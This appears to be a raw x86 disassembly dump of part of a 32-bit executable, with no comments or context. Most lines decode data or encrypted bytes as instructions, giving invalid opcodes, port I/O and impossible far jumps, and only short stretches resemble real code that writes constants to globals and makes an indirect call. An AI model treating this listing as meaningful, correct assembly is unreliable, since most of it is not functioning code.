  407b5f:	test   eax,0x2e66eec9
  407b64:	adc    eax,0xac98d26
  407b69:	int3   
  407b6a:	out    0x37,al
  407b6c:	(bad)  
  407b6d:	fstp   QWORD PTR [edx-0x6b]
  407b70:	cmp    al,0xe0
  407b72:	mov    dh,0x9a
  407b74:	xor    dh,dh
  407b76:	out    0x37,al
  407b78:	sub    ebx,DWORD PTR [eax+ebp*2-0x4321753]
  407b7f:	jb     0x407b4b
  407b81:	mov    DWORD PTR [edx+0x49],esp
  407b84:	pop    eax
  407b86:	inc    ebp
  407b87:	mov    al,0x6d
  407b89:	jo     0x407b3f
  407b8b:	fadd   QWORD PTR [esi-0x34]
  407b8e:	hlt    
  407b8f:	retf   0x963c
  407b92:	and    dh,BYTE PTR [ecx]
  407b94:	div    DWORD PTR [eax-0x6d151c8e]
  407b9a:	and    al,0xae
  407b9c:	(bad)  
  407b9d:	and    cl,bh
  407b9f:	scas   eax,DWORD PTR es:[edi]
  407ba0:	xor    ebx,edi
  407ba2:	(bad)  
  407ba3:	and    dh,ah
  407ba5:	lahf   
  407ba6:	popa   
  407ba7:	dec    esp
  407ba8:	fisub  DWORD PTR [edx+0x68109e44]
  407bae:	dec    ebp
  407baf:	in     eax,dx
  407bb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bb1:	das    
  407bb2:	out    0x92,al
  407bb4:	xchg   ebp,eax
  407bb5:	mov    al,ds:0x327f14e3
  407bba:	sbb    BYTE PTR [ebp-0x50],dh
  407bbd:	or     DWORD PTR [ecx+0xb],esi
  407bc0:	repnz mov ah,0xd
  407bc3:	xor    cl,ah
  407bc5:	arpl   dx,sp
  407bc7:	out    dx,al
  407bc8:	fidivr WORD PTR [edi]
  407bca:	xchg   edx,eax
  407bcb:	push   cs
  407bcc:	mov    eax,DWORD PTR [edx+ebx*4-0x28dfbf98]
  407bd3:	das    
  407bd4:	jmp    0x407bea
  407bd6:	call   0x878d:0x95f6aca
  407bdd:	imul   edx,ebx,0xffffffd7
  407be0:	xchg   ebp,eax
  407be1:	in     al,0x57
  407be3:	stos   DWORD PTR es:[edi],eax
  407be4:	popf   
  407be5:	in     al,0x34
  407be7:	shl    DWORD PTR [ebp-0x38],1
  407bea:	add    edx,eax
  407bec:	(bad)  
  407bee:	aad    0xdb
  407bf0:	add    al,bh
  407bf2:	rcr    ch,1
  407bf4:	push   0x2bfaeefc
  407bf9:	pop    es
  407bfa:	sub    eax,0xcb641f15
  407bff:	popf   
  407c00:	sbb    al,0x25
  407c02:	xor    BYTE PTR [eax+0x54],ah
  407c05:	add    BYTE PTR [eax+0x48f7c0ae],ch
  407c0b:	daa    
  407c0c:	loop   0x407c67
  407c0e:	(bad)  [eax]
  407c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c11:	retf   
  407c12:	mov    dl,0x51
  407c14:	out    0x77,al
  407c16:	ja     0x407bfe
  407c18:	scas   al,BYTE PTR es:[edi]
  407c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c1a:	jns    0x407bab
  407c1c:	mov    esi,0x2271c60a
  407c21:	pop    ds
  407c22:	popa   
  407c23:	je     0x407c51
  407c25:	out    dx,eax
  407c26:	xlat   BYTE PTR ds:[ebx]
  407c27:	jo     0x407c7c
  407c29:	jmp    0x92529973
  407c2e:	jae    0x407c2a
  407c30:	mov    eax,0xdfa8432b
  407c35:	xchg   ebx,eax
  407c36:	fs out 0x2e,al
  407c39:	shr    BYTE PTR [ebp-0x46e9c30e],cl
  407c3f:	xor    ebx,DWORD PTR [esi]
  407c41:	mov    esp,0xae3981
  407c46:	dec    esp
  407c47:	xchg   ebx,eax
  407c48:	or     al,0x59
  407c4a:	ins    BYTE PTR es:[edi],dx
  407c4b:	test   al,0x1c
  407c4d:	sbb    DWORD PTR [ecx+0x5a3f37fb],edi
  407c53:	imul   edi,DWORD PTR [ecx+0x5a],0xb1d391fd
  407c5a:	out    0xd2,eax
  407c5c:	lods   eax,DWORD PTR ds:[esi]
  407c5d:	fcom   QWORD PTR [edx]
  407c5f:	retf   
  407c60:	lock rol BYTE PTR cs:[edi-0x53],1
  407c65:	cmp    eax,DWORD PTR [edx-0x32cf9d5c]
  407c6b:	out    0x73,al
  407c6d:	push   edx
  407c6e:	daa    
  407c6f:	xor    al,0x4b
  407c71:	pop    ss
  407c72:	outs   dx,BYTE PTR ds:[esi]
  407c73:	sub    al,0xe3
  407c75:	jmp    0x407c80
  407c77:	gs cmp eax,ecx
  407c7a:	push   esp
  407c7b:	pcmpgtw mm3,QWORD PTR [ebp-0x5a4c071f]
  407c82:	std    
  407c83:	xor    al,0x59
  407c85:	pop    ds
  407c86:	inc    ebx
  407c87:	xor    BYTE PTR [ebp+0x56b29f6c],dh
  407c8d:	pop    ebp
  407c8e:	pop    ss
  407c8f:	xchg   esi,eax
  407c90:	fistp  QWORD PTR [esi]
  407c92:	or     cl,BYTE PTR [ecx+0x2fbe0ea2]
  407c98:	inc    eax
  407c99:	mov    al,ds:0x8ee70972
  407c9e:	imul   edx,DWORD PTR [ebx-0x63ae2fb5],0x4945ce8
  407ca8:	popf   
  407ca9:	inc    ebp
  407caa:	pop    edi
  407cab:	push   ss
  407cac:	jl     0x407cae
  407cae:	xchg   esi,eax
  407caf:	in     eax,dx
  407cb0:	jnp    0x407c47
  407cb2:	xchg   esi,eax
  407cb3:	iret   
  407cb4:	inc    edx
  407cb5:	pushf  
  407cb6:	adc    al,0x99
  407cb8:	repnz rol BYTE PTR [ebp-0x6a],cl
  407cbc:	or     DWORD PTR [edx+0x3d082e3c],esi
  407cc2:	or     eax,0x314d3979
  407cc7:	fs in  al,0x93
  407cca:	mov    al,0x1e
  407ccc:	or     edx,DWORD PTR [ebx+0x6f]
  407ccf:	mov    ch,al
  407cd1:	jl     0x407c91
  407cd3:	popa   
  407cd4:	clc    
  407cd5:	mov    WORD PTR [ecx-0x65],?
  407cd8:	push   edi
  407cd9:	fldenv [edx-0x32871217]
  407cdf:	daa    
  407ce0:	js     0x407d57
  407ce2:	test   DWORD PTR [edi-0x65],ebp
  407ce5:	ret    0xd62a
  407ce8:	push   ds
  407ce9:	js     0x407c79
  407ceb:	gs xor eax,0xe743e456
  407cf1:	sbb    DWORD PTR [esp+edi*2+0x49ab957],esp
  407cf8:	mov    edi,0x16a4f0bc
  407cfd:	hlt    
  407cfe:	mov    edx,0xf775e850
  407d03:	stc    
  407d04:	push   ecx
  407d05:	setge  BYTE PTR [esi+0x1f]
  407d09:	(bad)  
  407d0a:	mov    ebx,0xb9c7efe9
  407d0f:	mov    dh,BYTE PTR [ecx]
  407d11:	lahf   
  407d12:	push   eax
  407d13:	xchg   ecx,eax
  407d14:	xor    bl,BYTE PTR [ebx+0x3af1ea8f]
  407d1a:	xor    eax,0xd98980aa
  407d1f:	inc    esi
  407d20:	out    0x52,al
  407d22:	fiadd  WORD PTR [eax]
  407d24:	sbb    edx,DWORD PTR [eax+0x64]
  407d27:	mov    esp,0xad454f22
  407d2c:	push   ebp
  407d2d:	cli    
  407d2e:	pop    ss
  407d2f:	mov    eax,0x89b95ae4
  407d34:	push   ebp
  407d35:	cld    
  407d36:	mov    DWORD PTR [ebp-0x30],0xba699573
  407d3d:	sbb    DWORD PTR ds:0x422982,edx
  407d43:	mov    eax,0x9c0a89d8
  407d48:	or     edx,0x5666
  407d4e:	mov    DWORD PTR [ebp-0x2c],eax
  407d51:	sub    DWORD PTR ds:0x422996,ebx
  407d57:	mov    DWORD PTR [ebp-0x20],0xba699577
  407d5e:	and    DWORD PTR ds:0x42294a,ecx
  407d64:	mov    DWORD PTR [ebp-0x1c],eax
  407d67:	mov    DWORD PTR [ebp-0x10],0xba69957b
  407d6e:	mov    DWORD PTR [ebp-0xc],eax
  407d71:	mov    DWORD PTR [ebp-0x60],0xba69957f
  407d78:	add    edx,0x428b
  407d7e:	mov    DWORD PTR [ebp-0x5c],eax
  407d81:	sbb    DWORD PTR ds:0x42289a,0x1b7d
  407d8b:	mov    eax,DWORD PTR [ebp-0x30]
  407d8e:	xor    DWORD PTR ds:0x42299a,0x1f10
  407d98:	jmp    0x408322
  407d9d:	mov    ch,0x6c
  407d9f:	or     eax,0x997014f1
  407da4:	sbb    BYTE PTR [edx-0x709133e9],bh
  407daa:	je     0x407dd8
  407dac:	mov    ah,0x1c
  407dae:	popa   
  407daf:	push   ss
  407db0:	push   ss
  407db1:	cmp    eax,0xf9161604
  407db6:	ror    ch,0xee
  407db9:	adc    eax,0xe34f2a3
  407dbe:	jmp    0xc1f3:0x3763fd81
  407dc5:	mov    ecx,0xed2c9e4e
  407dca:	push   0xbfe9eb75
  407dcf:	add    al,0xb3
  407dd1:	icebp  
  407dd2:	push   edx
  407dd3:	pop    ss
  407dd4:	dec    eax
  407dd5:	xor    ah,bl
  407dd7:	test   al,0xb8
  407dd9:	scas   eax,DWORD PTR es:[edi]
  407dda:	not    BYTE PTR [edi+0x48a552c2]
  407de0:	mov    edi,0xc4376d06
  407de5:	dec    edi
  407de6:	jg     0x407e09
  407de8:	shl    cl,0x12
  407deb:	adc    eax,0xed68e62
  407df0:	ds das 
  407df2:	fsubp  st(6),st
  407df4:	js     0x407de0
  407df6:	mov    al,0x86
  407df8:	imul   eax,ecx,0xffffffa0
  407dfb:	push   esp
  407dfc:	cmp    ebx,DWORD PTR [ecx]
  407dfe:	stc    
  407dff:	pusha  
  407e00:	jl     0x407e65
  407e02:	fcomp  st(7)
  407e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e05:	addr16 and eax,eax
  407e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e09:	push   ss
  407e0a:	xor    al,0x4
  407e0c:	inc    edx
  407e0d:	sub    di,ax
  407e10:	(bad)  
  407e12:	daa    
  407e13:	pop    eax
  407e14:	fstp   st(1)
  407e16:	frstor [edi-0x4d684946]
  407e1c:	adc    bh,BYTE PTR [edi-0x71031328]
  407e22:	push   es
  407e23:	pop    edi
  407e24:	inc    eax
  407e25:	mov    al,0x7d
  407e27:	jae    0x407e95
  407e29:	push   esp
  407e2a:	mov    DWORD PTR [edx+0x68018dd9],esi
  407e30:	rcr    DWORD PTR [ebp-0xe7ef94d],cl
  407e36:	cli    
  407e37:	push   edx
  407e38:	xchg   esi,eax
  407e39:	int3   
  407e3a:	xor    ecx,DWORD PTR [edx]
  407e3c:	neg    DWORD PTR [ecx-0x8]
  407e3f:	mov    DWORD PTR [ecx-0x20],ebx
  407e42:	popa   
  407e43:	pop    edx
  407e44:	ins    BYTE PTR es:[edi],dx
  407e45:	cmp    eax,0xe3815729
  407e4a:	xchg   ebp,eax
  407e4b:	test   DWORD PTR [eax],ebx
  407e4d:	mov    edi,0xc9c044b4
  407e52:	scas   eax,DWORD PTR es:[edi]
  407e53:	scas   eax,DWORD PTR es:[edi]
  407e54:	push   esp
  407e55:	dec    ecx
  407e56:	inc    ebx
  407e57:	jnp    0x407e51
  407e59:	stos   DWORD PTR es:[edi],eax
  407e5a:	mov    esp,0xeed36388
  407e5f:	aam    0x5f
  407e61:	(bad)  
  407e63:	sbb    ebx,DWORD PTR [edi*1-0x7a1e3c4b]
  407e6a:	pusha  
  407e6b:	inc    edi
  407e6c:	sahf   
  407e6d:	retf   0xc7de
  407e70:	loope  0x407ee4
  407e72:	int3   
  407e73:	xchg   edx,eax
  407e74:	popf   
  407e75:	inc    edx
  407e76:	or     al,0xf8
  407e78:	mov    edi,0x808ff2c8
  407e7d:	xchg   edx,eax
  407e7e:	or     BYTE PTR [esi-0x3195eea4],cl
  407e84:	sub    DWORD PTR [ecx+0x296926ac],ebx
  407e8a:	popa   
  407e8b:	fcomp  DWORD PTR [esi]
  407e8d:	sub    DWORD PTR [esi],esi
  407e8f:	jmp    0x407e41
  407e91:	mov    eax,ds:0xa26df34b
  407e96:	imul   esi,DWORD PTR [ebx-0x25ff3899],0xffffffe6
  407e9d:	call   0x6d8d:0x79e8adb7
  407ea4:	lea    ebp,[esi]
  407ea6:	repz mov dh,cl
  407ea9:	pop    esi
  407eaa:	xor    BYTE PTR [edx-0x14cfc8b7],ch
  407eb0:	mov    cl,0x8c
  407eb2:	and    al,0x76
  407eb4:	inc    edi
  407eb5:	dec    edx
  407eb6:	pushf  
  407eb7:	sub    DWORD PTR [esi+0x6d],esi
  407eba:	shl    edi,0xff
  407ebd:	dec    ecx
  407ebe:	cmp    BYTE PTR [ecx],ah
  407ec0:	in     al,0x73
  407ec2:	scas   eax,DWORD PTR es:[edi]
  407ec3:	mov    dl,0xa3
  407ec5:	repz inc edx
  407ec7:	and    al,0xc4
  407ec9:	dec    ebp
  407eca:	mov    dl,0x10
  407ecc:	inc    ebp
  407ecd:	lahf   
  407ece:	(bad)  
  407ed0:	jns    0x407e93
  407ed2:	div    BYTE PTR [ecx-0x29]
  407ed5:	jns    0x407ec4
  407ed7:	cwde   
  407ed8:	lods   al,BYTE PTR ds:[esi]
  407ed9:	sbb    eax,0x826a2089
  407ede:	aas    
  407edf:	ins    BYTE PTR es:[edi],dx
  407ee0:	test   eax,0x62206756
  407ee5:	xchg   edi,eax
  407ee6:	nop
  407ee7:	icebp  
  407ee8:	adc    BYTE PTR [ecx],bh
  407eea:	ja     0x407f49
  407eec:	xchg   BYTE PTR [esi-0x25],ch
  407eef:	pop    ss
  407ef0:	sbb    esp,0xffffffe5
  407ef3:	pushf  
  407ef4:	dec    ebp
  407ef5:	retf   0x7b42
  407ef8:	aas    
  407ef9:	pop    ebx
  407efa:	aas    
  407efb:	mov    bh,0xf5
  407efd:	cmp    eax,0x8a8844d5
  407f02:	jo     0x407f10
  407f04:	into   
  407f05:	add    al,0xe1
  407f07:	mov    cl,0x72
  407f09:	cmc    
  407f0a:	bound  edx,QWORD PTR [edi-0x5b08d643]
  407f10:	add    ecx,DWORD PTR [edx+0x7d66162c]
  407f16:	or     ah,cl
  407f18:	retf   0xfe48
  407f1b:	sbb    al,0xdd
  407f1d:	call   0xf86b8a40
  407f22:	popa   
  407f23:	jne    0x407f4a
  407f25:	inc    esi
  407f26:	cli    
  407f27:	lahf   
  407f28:	push   esp
  407f29:	xlat   BYTE PTR ds:[ebx]
  407f2a:	adc    dl,BYTE PTR [esp+eax*4]
  407f2d:	jp     0x407f2e
  407f2f:	mov    eax,ds:0xaaf1d7bd
  407f34:	ror    ch,0x79
  407f37:	das    
  407f38:	je     0x407f5b
  407f3a:	sbb    DWORD PTR es:[edi-0xad592b3],0x67
  407f42:	and    DWORD PTR [edx],esi
  407f44:	add    ah,BYTE PTR ds:0x45cd871c
  407f4a:	stc    
  407f4b:	adc    al,0xd5
  407f4d:	or     DWORD PTR [esi-0x3d],ebx
  407f50:	sbb    al,0x83
  407f52:	clc    
  407f53:	outs   dx,DWORD PTR ds:[esi]
  407f54:	jns    0x407f1b
  407f56:	sbb    DWORD PTR [edx-0xa],ebx
  407f59:	xchg   DWORD PTR [ecx+0x1faa7d0],ebx
  407f5f:	jbe    0x407f36
  407f61:	or     edx,DWORD PTR [eax+0x77904e16]
  407f67:	jmp    0xab68:0xbf88ab7d
  407f6e:	sbb    BYTE PTR [edi],dh
  407f70:	(bad)  
  407f71:	nop
  407f72:	mov    ds:0xb52eef13,al
  407f77:	fwait
  407f78:	lods   al,BYTE PTR ds:[esi]
  407f79:	inc    edi
  407f7a:	xchg   ebp,eax
  407f7b:	xchg   edx,eax
  407f7c:	add    dl,bl
  407f7e:	(bad)  
  407f7f:	cmp    BYTE PTR [edi],al
  407f81:	mov    eax,ds:0xb8dd5620
  407f86:	dec    ecx
  407f87:	push   esi
  407f88:	mul    BYTE PTR [esi+0x51be73ae]
  407f8e:	std    
  407f8f:	or     ah,BYTE PTR ds:0xc5e9fbb
  407f95:	or     edi,DWORD PTR [esi+0x2cf41f0d]
  407f9b:	dec    ecx
  407f9c:	add    al,0x96
  407f9e:	mov    al,ds:0x9e7071c7
  407fa3:	mov    es,ebp
  407fa5:	dec    esi
  407fa6:	xchg   edx,eax
  407fa7:	sar    DWORD PTR [ebp-0x46a628a2],0xfd
  407fae:	dec    ebp
  407faf:	pop    eax
  407fb0:	aad    0xa
  407fb2:	push   ebx
  407fb3:	dec    esi
  407fb4:	mov    dh,0xdb
  407fb6:	sub    eax,0x24beb0a7
  407fbc:	push   ss
  407fbd:	adc    al,0x7f
  407fbf:	popf   
  407fc0:	popa   
  407fc1:	xlat   BYTE PTR ds:[ebx]
  407fc2:	xchg   edi,eax
  407fc3:	mov    eax,0xfb1b948
  407fc8:	test   dl,bh
  407fca:	xor    DWORD PTR [ebp+eiz*1+0x676381f5],edx
  407fd1:	cmp    al,0x69
  407fd3:	stos   BYTE PTR es:[edi],al
  407fd4:	nop
  407fd5:	mov    dl,0x1f
  407fd7:	xor    dh,dl
  407fd9:	mul    DWORD PTR [esp+ebp*4-0x5ee485d5]
  407fe0:	fwait
  407fe1:	jne    0x407fc0
  407fe3:	fild   WORD PTR [edx]
  407fe5:	fcmovnbe st,st(5)
  407fe7:	(bad)  [ebx+0x63]
  407fea:	mov    eax,ds:0x14e74dd5
  407fef:	push   ds
  407ff0:	jmp    0x629:0x18c0cb48
  407ff7:	pop    es
  407ff8:	push   edi
  407ff9:	mov    al,0x44
  407ffb:	pop    esp
  407ffc:	cwde   
  407ffd:	jo     0x408061
  407fff:	out    0x11,al
  408001:	adc    BYTE PTR [ecx],al
  408003:	adc    BYTE PTR [ecx+ebp*1-0x3e],ah
  408007:	xchg   edi,eax
  408008:	add    edi,DWORD PTR [ebx-0x4c2d1b01]
  40800e:	jecxz  0x408018
  408010:	push   esi
  408011:	fimul  WORD PTR [eax+0x336c3648]
  408017:	(bad)  
  408018:	pop    edx
  408019:	jecxz  0x407ff3
  40801b:	xor    cl,BYTE PTR [edx]
  40801d:	hlt    
  40801e:	hlt    
  40801f:	sahf   
  408020:	mov    esi,0x5e6905f1
  408025:	fadd   QWORD PTR [edx]
  408027:	sbb    bl,BYTE PTR [ebx+0x34]
  40802a:	pushf  
  40802b:	push   ss
  40802c:	or     dl,BYTE PTR [eax+0x257740f3]
  408032:	scas   eax,DWORD PTR es:[edi]
  408033:	mov    edx,0x6d85687a
  408038:	inc    esi
  408039:	jle    0x407fee
  40803b:	pushf  
  40803c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40803d:	and    BYTE PTR [ecx+0x71],cl
  408040:	aaa    
  408041:	lea    ebp,ds:0xbc99db67
  408047:	mov    bh,0xb
  408049:	cmp    BYTE PTR [esi-0x54],0x28
  40804d:	in     al,dx
  40804e:	or     ebx,DWORD PTR [esi+0x4a]
  408051:	aas    
  408052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408053:	inc    edi
  408054:	xchg   ebx,eax
  408055:	loope  0x4080a1
  408057:	cli    
  408058:	bound  ebp,QWORD PTR [esi]
  40805a:	inc    esp
  40805b:	sub    BYTE PTR [ebp+0x5ee32822],0x53
  408062:	add    DWORD PTR [ebp-0x1d],esi
  408065:	retf   
  408066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408067:	and    eax,0x1844d655
  40806c:	out    dx,eax
  40806d:	mov    al,0xf5
  40806f:	rcr    al,0x34
  408072:	sub    al,0x6d
  408074:	adc    esi,edi
  408076:	retf   
  408077:	shr    eax,1
  408079:	in     eax,0x85
  40807b:	pop    ecx
  40807c:	inc    edi
  40807d:	push   0xfffffff9
  40807f:	inc    ecx
  408080:	fnstenv [ebx+0x4]
  408083:	bound  edx,QWORD PTR [edi-0x307cda61]
  408089:	jnp    0x408101
  40808b:	cld    
  40808c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40808d:	fcmove st,st(0)
  40808f:	and    eax,0xc187d26c
  408094:	lahf   
  408095:	jno    0x4080ba
  408097:	ret    0xf44b
  40809a:	mov    edi,0x7618e0a0
  40809f:	popf   
  4080a0:	rcl    ecx,1
  4080a2:	outs   dx,DWORD PTR es:[esi]
  4080a4:	gs stc 
  4080a6:	mov    edx,DWORD PTR [edi+eiz*1+0x3f]
  4080aa:	inc    ebp
  4080ab:	scas   eax,DWORD PTR es:[edi]
  4080ac:	sub    BYTE PTR [esi-0x53],dl
  4080af:	je     0x40811d
  4080b1:	mov    ebx,0xb375b3b
  4080b6:	xor    edx,ecx
  4080b8:	xchg   ebx,eax
  4080b9:	mov    eax,0x5c179baf
  4080be:	xor    dl,BYTE PTR [ebx+eax*1]
  4080c1:	das    
  4080c2:	jns    0x40810c
  4080c4:	test   BYTE PTR [ecx],bh
  4080c6:	shr    DWORD PTR [ecx+0x39804fd5],cl
  4080cc:	add    esi,DWORD PTR [esi+ebx*1]
  4080cf:	push   ds
  4080d0:	xor    eax,0xde68296c
  4080d5:	mov    dl,0xcd
  4080d7:	aas    
  4080d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080d9:	or     esi,ecx
  4080db:	retf   
  4080dc:	cs dec ebp
  4080de:	sub    dl,BYTE PTR [esi]
  4080e0:	in     eax,dx
  4080e1:	pushf  
  4080e2:	xor    al,BYTE PTR [edi]
  4080e4:	sbb    dh,al
  4080e6:	loop   0x4080c1
  4080e8:	and    DWORD PTR [esi],ebp
  4080ea:	fcom   QWORD PTR ds:0xb37740f7
  4080f0:	js     0x408148
  4080f2:	sar    DWORD PTR [esi-0x1e],1
  4080f5:	sti    
  4080f6:	loopne 0x408078
  4080f8:	(bad)  
  4080fa:	add    edi,DWORD PTR [esp+eiz*8]
  4080fd:	inc    ecx
  4080fe:	adc    BYTE PTR [edi+0x71a09087],0x75
  408105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408106:	out    dx,al
  408107:	xor    ebx,DWORD PTR [edx]
  408109:	inc    edi
  40810a:	jo     0x4080b1
  40810c:	mov    esp,0x5072a377
  408111:	cs jmp 0x4c67:0xb5ee5bb3
  408119:	mov    ebp,0xb05e17b4
  40811e:	jb     0x408175
  408120:	and    DWORD PTR [ecx],0x8bcb0b3
  408126:	jo     0x4080df
  408128:	aam    0x6b
  40812a:	retf   
  40812b:	jns    0x4080fd
  40812d:	xor    al,0x8c
  40812f:	xchg   edx,eax
  408130:	pop    ecx
  408131:	xor    eax,DWORD PTR [edx-0x68d7f0ca]
  408137:	outs   dx,DWORD PTR ds:[esi]
  408138:	sbb    BYTE PTR [edi+0x14],al
  40813b:	or     ch,bh
  40813d:	jle    0x4080f8
  40813f:	fwait
  408140:	das    
  408141:	pop    ebx
  408142:	scas   eax,DWORD PTR es:[edi]
  408143:	mov    esi,ebp
  408145:	xor    BYTE PTR [ecx+0x5d72c36a],dh
  40814b:	(bad)  
  40814c:	fmul   QWORD PTR [ecx-0x1f]
  40814f:	xor    bl,BYTE PTR [edi-0x52e04c28]
  408155:	adc    edx,ebp
  408157:	cli    
  408158:	ja     0x408185
  40815a:	fistp  QWORD PTR [eax-0x5c]
  40815d:	jg     0x40812e
  40815f:	mov    esp,0x3ab552f5
  408164:	mov    cl,0x83
  408166:	and    eax,0xa42f0f68
  40816b:	cs pop ds
  40816d:	push   eax
  40816e:	sbb    dh,dh
  408170:	mov    cl,0x5c
  408172:	mov    al,0xad
  408174:	push   edi
  408175:	push   ds
  408176:	fimul  WORD PTR [esi+0x6a360343]
  40817c:	mov    esi,0xf7703a0b
  408181:	(bad)  
  408182:	cld    
  408183:	stos   DWORD PTR es:[edi],eax
  408184:	imul   eax,DWORD PTR [esi+0x4a4d05bf],0xffffffbf
  40818b:	mov    ds:0x8bd40175,eax
  408190:	mov    ebp,0x4822ae79
  408195:	dec    ebp
  408196:	or     DWORD PTR [edx+0x7d87ba85],esp
  40819c:	enter  0x960e,0x6e
  4081a0:	sub    al,0xb5
  4081a2:	jno    0x408215
  4081a4:	inc    ecx
  4081a5:	shr    DWORD PTR [eax+ecx*8],0xb2
  4081a9:	cmp    BYTE PTR [esi+0x4f6de4b3],al
  4081af:	inc    ecx
  4081b0:	xchg   ebx,eax
  4081b1:	xor    eax,0x382ecdfa
  4081b6:	xlat   BYTE PTR ds:[ebx]
  4081b7:	mov    dl,0xcc
  4081b9:	jmp    0xb9a4:0xe23dbe8f
  4081c0:	or     al,BYTE PTR [esi+0x17]
  4081c3:	bound  eax,QWORD PTR [eax+0x5e]
  4081c6:	lock or edx,DWORD PTR [ebp-0x15]
  4081ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081cb:	mov    cl,0xb4
  4081cd:	aam    0x1
  4081cf:	cli    
  4081d0:	xor    al,0xad
  4081d2:	jns    0x408211
  4081d4:	adc    BYTE PTR [eax+0x28],ch
  4081d7:	add    ecx,DWORD PTR ds:0x965886e3
  4081dd:	leave  
  4081de:	or     DWORD PTR [ebx*2+0x42175982],0xde020788
  4081e9:	mov    ch,0xf4
  4081eb:	int3   
  4081ec:	aam    0x6
  4081ee:	lds    esi,FWORD PTR [edx+0x5e]
  4081f1:	xchg   esp,eax
  4081f2:	cwde   
  4081f3:	lods   eax,DWORD PTR ds:[esi]
  4081f4:	(bad)  
  4081f5:	shr    DWORD PTR [edx-0x30b15ace],cl
  4081fb:	shl    bl,cl
  4081fd:	sti    
  4081fe:	pushf  
  4081ff:	enter  0xde1a,0x39
  408203:	in     eax,0x17
  408205:	test   eax,0x7b7da77
  40820a:	(bad)  
  40820b:	fcomip st,st(6)
  40820d:	(bad)  
  40820f:	cmp    DWORD PTR [eax],esp
  408211:	jmp    0x4081ea
  408213:	xchg   ebx,eax
  408214:	lea    eax,[ecx]
  408216:	push   edx
  408217:	mov    edi,0x2df450ea
  40821c:	add    eax,0xc1bf309c
  408221:	sbb    al,BYTE PTR [edi]
  408223:	fadd   st(5),st
  408225:	mov    cl,0xe2
  408227:	test   edx,ebp
  408229:	pop    ds
  40822a:	inc    esi
  40822b:	(bad)  
  40822c:	lods   eax,DWORD PTR ds:[esi]
  40822d:	jl     0x408259
  40822f:	es aas 
  408231:	call   0x9dcc:0xda2b1692
  408238:	mov    WORD PTR [edx+0x3e],es
  40823b:	gs or  eax,0x2c382e3b
  408241:	sbb    eax,0x4e5e09f4
  408246:	bound  ebp,QWORD PTR [edi-0x25f0746c]
  40824c:	inc    edx
  40824d:	mov    ds:0x2a0ec1f6,eax
  408252:	or     al,0x3c
  408254:	mov    bl,0x64
  408256:	dec    ebx
  408257:	ret    
  408258:	jmp    0x1ec8:0xe725a478
  40825f:	cmp    eax,DWORD PTR [esi+0x20]
  408262:	iret   
  408263:	imul   esp,DWORD PTR [eax+0xc73f5dd],0x60
  40826a:	dec    edx
  40826b:	pop    ebp
  40826c:	mov    al,ds:0xe2ec6e85
  408271:	mov    esi,0xeadcd4fa
  408276:	sbb    al,0x4a
  408278:	mov    cl,0xae
  40827a:	sub    al,0x4f
  40827c:	push   0x1e
  40827e:	call   0xdae79aa4
  408283:	ret    
  408284:	mov    dh,0x85
  408286:	or     al,dl
  408288:	cmp    eax,0xb6d05631
  40828d:	popa   
  40828e:	in     al,0x8a
  408290:	(bad)  
  408291:	jne    0x4082d4
  408293:	sbb    esp,esp
  408295:	jno    0x4082d2
  408297:	dec    ecx
  408298:	in     al,0x34
  40829a:	lods   al,BYTE PTR ds:[esi]
  40829b:	out    dx,eax
  40829c:	icebp  
  40829d:	shl    bl,1
  40829f:	sbb    bl,cl
  4082a1:	pop    ds
  4082a2:	jns    0x40826d
  4082a4:	ss add al,0x1e
  4082a7:	xlat   BYTE PTR ds:[ebx]
  4082a8:	(bad)  [ecx+0x7188c020]
  4082ae:	adc    dl,ah
  4082b0:	and    BYTE PTR [ebp+0x1121d37c],0x67
  4082b7:	dec    edx
  4082b8:	fcom   QWORD PTR [eax-0x5fc690f]
  4082be:	fsubr  DWORD PTR [ebp+esi*2-0xb328e63]
  4082c5:	mov    eax,0x20d18d65
  4082ca:	hlt    
  4082cb:	stos   DWORD PTR es:[edi],eax
  4082cc:	mov    bl,0x7e
  4082ce:	(bad)  
  4082cf:	pop    esi
  4082d0:	push   esp
  4082d1:	es sub ebp,esi
  4082d4:	mov    edx,0xec8e0c1b
  4082d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082da:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4082dc:	inc    ebp
  4082dd:	mov    edi,0x690a8abd
  4082e2:	or     eax,0xfdeed7f1
  4082e7:	arpl   WORD PTR [ebp+0x4a4567cc],si
  4082ed:	pop    edi
  4082ee:	or     edi,DWORD PTR [ebx-0x7184d7e8]
  4082f4:	xor    dl,bh
  4082f6:	cli    
  4082f7:	inc    ebp
  4082f8:	(bad)  [edi]
  4082fa:	aas    
  4082fb:	lods   eax,DWORD PTR ds:[esi]
  4082fc:	mov    ebp,0xcdc1c19c
  408301:	and    eax,edx
  408303:	gs cmp esp,edi
  408306:	jbe    0x408301
  408308:	pop    edi
  408309:	sbb    eax,DWORD PTR [edi-0x22a34e4a]
  40830f:	rcr    edi,cl
  408311:	push   edx
  408312:	adc    DWORD PTR [esi-0x66eca803],0xa52097b
  40831c:	pusha  
  40831d:	mov    ds:0xef4e427d,eax
  408322:	mov    ecx,DWORD PTR [ebp-0x2c]
  408325:	shrd   eax,ecx,0x2
  408329:	cmp    DWORD PTR ds:0x422946,0x0
  408330:	movzx  edx,WORD PTR ds:0x4228f2
  408337:	mov    DWORD PTR ds:0x42291a,0x73f0
  408341:	mov    DWORD PTR ds:0x4228a6,0x5bc0
  40834b:	mov    DWORD PTR ds:0x4228a6,edi
  408351:	jmp    0x4083c2
  408356:	mov    DWORD PTR ds:0x422966,0x16dc
  408360:	ja     0x40839a
  408366:	push   0x7c34
  40836b:	push   0x2548
  408370:	push   0x422922
  408375:	push   0x4229d2
  40837a:	call   DWORD PTR ds:0x42a04c
